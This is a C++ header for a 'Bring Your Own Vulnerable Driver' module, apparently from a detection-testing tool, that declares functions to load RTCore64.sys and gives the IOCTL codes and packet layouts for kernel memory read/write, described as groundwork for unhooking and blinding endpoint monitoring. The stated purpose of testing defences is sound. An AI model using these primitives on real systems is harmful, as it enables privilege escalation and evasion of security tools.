#pragma once
#ifndef BYOVD_H
#define BYOVD_H
#include "common.h"

// BYOVD — Bring Your Own Vulnerable Driver (T1068).
//
// Loads a signed-but-vulnerable kernel driver to gain arbitrary kernel
// read/write from user mode. Used as the prerequisite for KernelUnhook
// and ETWTiBlind.
//
// Chosen driver: RTCore64.sys (MSI Afterburner utility driver)
//   - Version: any pre-patched version (widely available)
//   - Signature: Microsoft WHQL signed
//   - IOCTLs:
//       0x80002048 — kernel memory read  (addr, size → value)
//       0x8000204C — kernel memory write (addr, value, size)
//   - CVE: no CVE assigned (known-vulnerable driver, LOLDrivers.io)
//
// Blocklist status:
//   - WDAC / Smart App Control blocklist: BLOCKED on Win11 22H2+ if enforced
//   - LOLDrivers.io: listed as known-vulnerable
//   - Defender can be configured to block via driver blocklist policy
//
// This module tests whether your system:
//   1. Blocks loading of a known-vulnerable signed driver (WDAC/blocklist)
//   2. Alerts on kernel memory R/W from a non-OS driver (ETW-Ti)
//   3. Detects driver installation (Sysmon EID 6, Security event 7045)
//
// MITRE T1068 — Exploitation for Privilege Escalation (via kernel driver)
// MITRE T1014 — Rootkit (kernel R/W enables rootkit operations)

namespace BYOVD {
    // Drop RTCore64.sys from embedded bytes or from `driverPath`,
    // install as a service, and load it.
    // Returns driver service handle or NULL on failure.
    SC_HANDLE LoadDriver(const char* driverPath);

    // Unload and delete the driver service.
    void UnloadDriver(SC_HANDLE hSvc, const char* serviceName = "RTCore64");

    // Kernel memory read: read `size` bytes from kernel virtual address `addr`.
    // Requires LoadDriver() to have been called first.
    bool KernelRead(HANDLE hDev, DWORD64 addr, PVOID buf, DWORD size);

    // Kernel memory write: write `size` bytes to kernel virtual address `addr`.
    bool KernelWrite(HANDLE hDev, DWORD64 addr, PVOID buf, DWORD size);

    // Open the device handle for RTCore64.
    HANDLE OpenDevice();

    // Check if the driver is currently loaded and accessible.
    std::string CheckStatus();

    // Full workflow: drop driver, load, confirm kernel R/W, report detection events.
    std::string Demo(const char* driverPath);
}

// RTCore64 IOCTL codes
#define RTCORE64_IOCTL_READ  0x80002048
#define RTCORE64_IOCTL_WRITE 0x8000204C

// RTCore64 read/write packet structure
#pragma pack(push, 1)
struct RTCoreReadPkt  { BYTE pad1[8]; DWORD64 addr; BYTE pad2[4]; DWORD size; BYTE pad3[4]; DWORD64 value; };
struct RTCoreWritePkt { BYTE pad1[8]; DWORD64 addr; BYTE pad2[4]; DWORD size; BYTE pad3[4]; DWORD64 value; };
#pragma pack(pop)

#endif
